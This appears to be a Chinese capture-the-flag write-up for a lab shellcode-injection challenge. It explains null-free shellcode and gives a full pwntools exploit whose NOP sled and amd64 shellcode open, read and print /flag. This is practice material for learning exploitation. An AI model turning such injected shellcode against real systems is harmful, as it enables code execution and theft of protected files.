# 挑战简介
```
此挑战会读取一些字节，修改它们（取决于特定的挑战配置），然后将其作为代码执行！这是一种常见的利用场景，称为“代码注入”。
通过这一系列挑战，您将在各种约束下练习您的 shellcode 编写技能！为了确保您是在编写 shellcode，而不是使用其他技巧，这将清理所有环境变量和参数并关闭所有大于 2 的文件描述符。

在 0x290f3000 处为 shellcode 映射了 0x1000 字节！
从 stdin 读取 0x1000 字节。
```

# 思路
简而言之,你的注入代码里不能有NULL字符,这在平常的栈溢出中也是有要求的,一般程序都会在检测到NULL字符的时候中断,这也是防止栈溢出的一种手段  
对于优化shellcode使其没有NULL字符,称为NULL_Free,在<https://nets.ec/Shellcode/Null-free?setlang=zh-cn>中也有记载,强烈推荐细读  
```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)
p = process('/challenge/binary-exploitation-null-free-shellcode')

p.recvuntil('Reading 0x1000 bytes from stdin.\n')

nop_sled_length = 0x900

nop_sled = asm('nop') * nop_sled_length

shellcode = asm('''
    xor rax, rax                      # 清理rax,利用xor代替mov归零,可以有效消除NULL
    push rax                          # 将0压入栈顶,利用push代替mov,有效代替NULL字节
    mov rbx, 0x67616c662f6a6a6a       # 将倒转后的jjj/flag推入栈
    shr rbx, 24                       # 向右移动24位(3个字节,对应'jjj'),以去除多余字符
    push rbx                          # 推入栈
    mov rdi, rsp                      # rsp指向flag, 替代rdi
    xor rsi, rsi                      # 清理rsi
    xor rdx, rdx                      # 清理rdx
    mov al, 2                         # 执行打开指令 (使用al代替rax避免NULL字节)
    syscall                           # open('/flag', O_RDONLY)

    mov rdi, rax                      # 文件描述符
    mov rsi, rsp                      # 移动缓冲区进栈
    mov dl, 100                       # 读取的字节数 (使用dl代替rdx避免NULL字节)
    xor rax, rax                      # 执行读取指令
    syscall                           # read(fd, buffer, 0x100)

    mov dil, 1                        # 输出描述符 (使用edi代替rdi避免NULL字节),使用rdi的更低位,也可有效消除NULL
    mov al, 1                         # 执行写入 (使用al代替rax避免NULL字节)
    syscall                           # write(stdout, buffer, 0x100)

''')

# 构建payload
payload_o = nop_sled + shellcode

payload = payload_o.ljust(0x1000, b'\x90')  # 填充剩余空间为NOP指令
print(len(payload))
p.send(payload_o)
output = p.recvall()
print(output.decode(errors='ignore'))
```
